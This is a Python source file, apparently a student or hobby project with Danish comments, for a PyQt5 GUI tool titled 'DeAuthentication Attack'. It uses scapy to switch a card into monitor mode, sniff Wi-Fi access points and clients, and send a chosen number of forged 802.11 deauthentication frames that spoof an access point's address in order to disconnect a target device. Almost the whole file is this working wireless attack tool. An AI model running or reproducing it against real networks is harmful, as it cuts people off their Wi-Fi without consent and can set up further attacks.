#!/usr/bin/env python3
# coding=utf-8
from PyQt5.QtWidgets import QMainWindow, QApplication,QPushButton,QLineEdit, QLabel, QTextBrowser
from PyQt5 import QtGui
from PyQt5.QtCore import pyqtSlot
from scapy.all import *
from subprocess import check_output
import re
import threading
import pyx

ssid_bssid = []
STA_list = []
channel_enganged = False

iface = "wlan0mon"
timeout = 1


resetflag = False
packetcount = 0

def setChannel():
	channel = random.randint(1,14)
	moncheck = check_output(["sudo","iwconfig","wlan0mon","channel",str(channel)], stderr=subprocess.PIPE).decode("UTF-8")


def FindSSIDtest(frame):
	setChannel() #we try a random channel every call. nok ikke specielt efficient.
	if frame.haslayer(Dot11): #der kunne bare stå haslayer(Dot11Beacon)
		if frame.type == 0 and frame.subtype == 8: #KUN beacon frames!!
			SSID = frame.info
			BSSID = frame.addr3.upper()
			#print(bssid)
			if (BSSID,SSID) not in ssid_bssid and len(SSID) != 0: #gider ikke hidden SSIDs aka 0 len.
				ssid_bssid.append((BSSID,SSID))
				ch = int(ord(frame[Dot11Elt:3].info))

				print("Found BSSID " + BSSID + " and SSID "+SSID +" on channel: " +str(ch))#addr 3 er bssid (mac addresse for ap) , frame.info er SSID



def FindSTAinSpecificBSSID(bssidsearch,frame,channel):
	global channel_enganged
	if channel_enganged == False:
		moncheck = check_output(["sudo", "iwconfig", "wlan0mon", "channel", str(channel)], stderr=subprocess.PIPE).decode("UTF-8")
		channel_enganged = True


	BSSID = "ff:ff:ff:ff:ff:ff"

	if frame.haslayer(Dot11):
		if frame.type == 2:
			DS = frame.FCfield & 0x03
			toDS = DS & 0x01 != 0
			fromDS = DS & 0x2 != 0


			if toDS == 0 and fromDS == 0:  # dette burde KUN være data frames der sendes til AP.
				RA = DA = frame.addr1.upper()  # RA= REciver, DA = fianl destination
				TA = SA = frame.addr2.upper()
				BSSID = frame.addr3.upper()

			elif toDS == 0 and fromDS == 1:
				RA = DA = frame.addr1.upper()  # RA= REciver, DA = fianl destination
				TA = BSSID = frame.addr2.upper()
				SA = frame.addr3.upper()

			elif toDS == 1 and fromDS == 0:
				RA = BSSID = frame.addr1.upper()
				TA = SA = frame.addr2.upper()
				DA = frame.addr3.upper()

			elif toDS == 1 and fromDS == 1:
				RA = frame.addr1.upper()
				TA = frame.addr2.upper()
				DA = frame.addr3.upper()
				SA = frame.addr4.upper()
			else:
				SA = "ff:ff:ff:ff:ff:ff"  # dette burde ikke kunne ske
				BSSID = "ff:ff:ff:ff:ff:ff"

			if SA not in STA_list and BSSID == bssidsearch:
				STA_list.append(SA)
				#print("VALUE OF toDS = " + str(toDS))
				#print("VALUE OF fromDS = "+str(fromDS))
				print("FOUND NEW STATION: " + SA + " FROM AP: " + BSSID)

			#frame.pdfdump(filename= "frame"+str(i) +".pdf")
			#frame.pdfdump()


def setMonitorMode():
	"""

	:return:
	"""
	checkphrase_mon_success = "monitor mode vif enabled"
	checkphrase_mon = "Mode:Monitor"

	moncheck = check_output(["iwconfig"],stderr=subprocess.PIPE).decode("UTF-8") #stderr=subprocess.PIPE simply "silences" the output.

	if checkphrase_mon in moncheck:
		print("wlan0mon is already in Monitor Mode!")

	else:
		airmoncheck = check_output(["airmon-ng", "start", "wlan0"],stderr=subprocess.PIPE).decode("UTF-8")
		if checkphrase_mon_success in airmoncheck:
			print("Sucessfully set wlan0 to Monitor Mode (now called wlan0mon)!")
		else:
			raise SystemExit("wlan0 has not entered Monitor Mode, recheck.")




def perform_deauth_attack(interface,dest,bssid,amount):
	"""
	interface, is the wireless interface
	destination is the target we wish to deuath
	bssid is the mac address of the AP. (string, MAC)

	:param interface:
	:param dest:
	:param bssid:
	:return:
	"""
	global packetcount #ville gerne bare kunne returne packet count af funktionen aka. i værdien, i forloopet, men problemet er at den er nødt til at køre som en Thread.
	radio_p = RadioTap()
	dot11_frame = Dot11(subtype=0xc,addr1=dest,addr2=bssid,addr3=bssid) #0xc is hex for 12, and 1100 in integer (deuath sub type value)
	deauth = Dot11Deauth(reason=3) #reason list, see 802.11 deauth reason codes,
	# https://community.cisco.com/t5/wireless-mobility-documents/802-11-association-status-802-11-deauth-reason-codes/ta-p/3148055
	frame = radio_p/dot11_frame/deauth

	frame.pdfdump()




	#hexdump(frame)
	#ls(frame)
	#frame.summary()


	#sendp(frame,iface=interface, count=amount,inter=0.1,verbose=False) #'wlan0mon' - set verbose true if you want to see packet output amount.
	#print(end-start) #takes about 3.6 seconds to send 1000 packets at a speed of 0.0001
	#sendpfast(frame,iface=interface,pps=1000,loop=amount,parse_results=1)

	#sendp(frame, iface=interface, count=amount,inter=0.2,verbose=False)
	#endTOTAL = time.time()
	#print(endTOTAL - startTOTAL)

	attack_timer = time.time()

	for i in range(0,amount):
		if resetflag == True:
			#print("RESET BUTTON CLICKED")
			return "RESET BUTTON CLICKED"
			#break
		else:
			#start = time.time()
			sendp(frame,iface=interface,verbose=False)
			#end = time.time()
			#print(end - start)
			packetcount +=1

	end_attack_timer = time.time()
	total_attack_time = (end_attack_timer - attack_timer)
	print("TOTAL TIME SPENT ON PACKETS SENT")
	print(total_attack_time)
	print("TOTAL PACKETS SENT: ")
	print(packetcount)

	#endTOTAL = time.time()
	#print(endTOTAL - startTOTAL)  # takes about 40 seconds to send 1000 deuath packets in a for loop.


class App(QMainWindow):
	def __init__(self):
		super().__init__()
		self.title = "DeAuthentication Attack"
		self.setupUI()

	def setupUI(self):
		global packetcount
		setMonitorMode()
		self.setWindowTitle(self.title)
		self.setGeometry(50,50,700,700)


		#MAC AP
		self.textboxAP = QLineEdit(self)
		self.textboxAP.setPlaceholderText("Enter the target AP MAC address")
		self.textboxAP.move(20,30)
		self.textboxAP.resize(280, 40)
		#MAC TARGET
		self.textbox = QLineEdit(self)
		self.textbox.setPlaceholderText("Enter the target MAC address")
		self.textbox.move(20,80)
		self.textbox.resize(280,40)

		#AMOUNT
		self.textbox_amount = QLineEdit(self)
		self.textbox_amount.setPlaceholderText("Enter amount of packets")
		self.textbox_amount.move(20,130)
		self.textbox_amount.resize(280,50)

		##ATTACK button
		self.attackbutton = QPushButton('ATTACK',self)
		self.attackbutton.resize(200,50)
		self.attackbutton.move(350,30)
		self.attackbutton.clicked.connect(self.on_attackclick)

		##RESET BUTTON
		self.resetbutton = QPushButton('RESET',self)
		self.resetbutton.resize(200,50)
		self.resetbutton.move(350,100)
		self.resetbutton.clicked.connect(self.on_resetclick)

		self.sniffSSIDbutton = QPushButton('Sniff SSIDs',self)
		self.sniffSSIDbutton.resize(200,50)
		self.sniffSSIDbutton.move(500,200)
		self.sniffSSIDbutton.clicked.connect(self.on_ssidsniff)


		#PACKET AMOUNT LABEL
		self.packetlabel = QLabel("Sent : "+str(packetcount)+"\n"+"DeAuthentication Packets",self)
		self.packetlabel.setFont(QtGui.QFont("Times",weight=QtGui.QFont.Bold))
		self.packetlabel.move(20,170)
		self.packetlabel.resize(270,100)

		#evt. lav QTextEdit?
		self.sniffbox = QTextBrowser(self)
		self.sniffbox.setText('Your output will be shown here')
		self.sniffbox.move(20,280)
		self.sniffbox.resize(300,300)



		self.show()


	@pyqtSlot()
	def on_ssidsniff(self):
		print("please work")



	@pyqtSlot()
	def on_attackclick(self):
		global resetflag
		global packetcount
		resetflag = False

		self.textboxAP.setEnabled(False)
		self.textbox.setEnabled(False)
		self.textbox_amount.setEnabled(False)
		#self.textboxAP.setText("40:F2:01:9A:42:56")#test remove me
		#self.textbox.setText("94:65:2D:D8:2E:16") #test remove me

		bssid_targetMAC = self.textboxAP.text() #string
		destMAC = self.textbox.text() #string
		packet_amount_entered = int(self.textbox_amount.text())
		print(bssid_targetMAC)
		print(destMAC)
		matchexpr = "[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$" #regex match
		if re.match(matchexpr, bssid_targetMAC.lower()) and re.match(matchexpr,destMAC.lower()):#checks if both inputs are valid MAC addreses (just format)

			attackthread = threading.Thread(target=perform_deauth_attack, args=(iface,destMAC, bssid_targetMAC, packet_amount_entered))
			attackthread.start()

			while attackthread.is_alive():
				self.packetlabel.setText("Sent : "+str(packetcount)+"\n"+"DeAuthentication Packets")
				self.packetlabel.repaint() #need to repaint the label each iteration to update value

			self.packetlabel.setText("Sent : " + str(packetcount) + "\n" + "DeAuthentication Packets")
			self.packetlabel.repaint()



		else:
			self.textbox_amount.setPlaceholderText("Enter amount of packets")
			self.textboxAP.setPlaceholderText("Enter valid AP MAC address")
			self.textbox.setPlaceholderText("Enter valid destination MAC address")
			self.textboxAP.setEnabled(True)
			self.textbox.setEnabled(True)
			self.textbox_amount.setEnabled(True)
			self.textbox.clear()
			self.textboxAP.clear()
			self.textbox_amount.clear()


	@pyqtSlot()
	def on_resetclick(self):
		global resetflag
		global packetcount

		self.textbox.clear()
		self.textboxAP.clear()
		self.textbox_amount.clear()
		self.textboxAP.setEnabled(True)
		self.textbox.setEnabled(True)
		self.textbox_amount.setEnabled(True)
		self.textboxAP.setPlaceholderText("Enter the target AP MAC address")
		self.textbox.setPlaceholderText("Enter the target MAC address")
		self.textbox_amount.setPlaceholderText("Enter amount of packets")

		resetflag = True
		packetcount = 0
		self.packetlabel.setText("Sent : " + str(packetcount) + "\n" + "DeAuthentication Packets")
		self.packetlabel.repaint()


if __name__ == '__main__':
	app = QApplication(sys.argv)
	ex = App()
	sys.exit(app.exec_())

